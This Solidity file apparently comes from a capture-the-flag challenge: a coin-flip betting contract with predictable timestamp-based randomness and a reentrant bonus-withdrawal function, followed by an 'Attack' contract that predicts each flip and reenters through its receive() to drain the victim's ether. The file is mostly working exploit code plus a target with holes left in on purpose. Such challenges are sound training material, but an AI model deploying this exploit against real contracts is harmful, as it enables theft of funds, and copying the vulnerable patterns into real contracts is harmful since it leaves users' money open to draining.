//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RollsRoyce {
    enum CoinFlipOption {
        HEAD,
        TAIL
    }

    address private bettingHouseOwner;
    address public currentPlayer;
    CoinFlipOption userGuess;
    mapping(address => uint256) playerConsecutiveWins;
    mapping(address => bool) claimedPrizeMoney;
    mapping(address => uint256) playerPool;

    constructor() payable {
        bettingHouseOwner = msg.sender;
    }

    receive() external payable {}

    function guess(CoinFlipOption _guess) external payable {
        require(currentPlayer == address(0), "There is already a player");
        require(msg.value == 1 ether, "To play it needs to be 1 ether");

        currentPlayer = msg.sender;
        depositFunds(msg.sender);
        userGuess = _guess;
    }

    function revealResults() external {
        require(
            currentPlayer == msg.sender,
            "Only the player can reveal the results"
        );

        CoinFlipOption winningOption = flipCoin();

        if (userGuess == winningOption) {
            playerConsecutiveWins[currentPlayer] =
                playerConsecutiveWins[currentPlayer] +
                1;
        } else {
            playerConsecutiveWins[currentPlayer] = 0;
        }
        currentPlayer = address(0);
    }

    function flipCoin() private view returns (CoinFlipOption) {
        return
            CoinFlipOption(
                uint256(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function viewWins(address _addr) public view returns (uint256) {
        return playerConsecutiveWins[_addr];
    }

    function depositFunds(address _to) internal {
        playerPool[_to] += msg.value;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }

    function withdrawPrizeMoney(address _to) public payable {
        require(
            msg.sender == _to,
            "Only the player can withdraw the prize money"
        );
        require(
            playerConsecutiveWins[_to] >= 3,
            "You need to win 3 or more consecutive games to claim the prize money"
        );

        if (playerConsecutiveWins[_to] >= 3) {
            uint256 prizeMoney = playerPool[_to];
            playerPool[_to] = 0;
            sendValue(payable(_to), prizeMoney);
        }
    }

    function withdrawFirstWinPrizeMoneyBonus() external {
        require(
            !claimedPrizeMoney[msg.sender],
            "You have already claimed the first win bonus"
        );
        playerPool[msg.sender] += 1 ether;
        withdrawPrizeMoney(msg.sender);
        claimedPrizeMoney[msg.sender] = true;
    }

    function isSolved() public view returns (bool) {
        // Return true if the game is solved
        return address(this).balance == 0;
    }
}

contract Attack {
    RollsRoyce victim;
    address owner;

    constructor(address payable _addr) public payable {
        owner = msg.sender;
        victim = RollsRoyce(_addr);
    }

    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint256(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function win() public payable {
        require(address(this).balance >= 1 ether, "Send contract some ether");
        RollsRoyce.CoinFlipOption result = flipCoin();
        victim.guess{value: 1 ether}(result);
        victim.revealResults();
    }

    function pwnContract() public payable {
        for (uint256 i = 0; i < 3; i++) {
            win();
        }
        victim.withdrawFirstWinPrizeMoneyBonus();
    }

    receive() external payable {
        if (
            victim.viewWins(address(this)) >= 3 && address(victim).balance > 0
        ) {
            victim.withdrawFirstWinPrizeMoneyBonus();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawBalance(uint256 amount) public {
        require(msg.sender == owner, "You not owner!");
        require(
            address(this).balance >= amount,
            "This contract has no more funds!"
        );
        (bool success, ) = msg.sender.call{value: amount}("");
    }
}
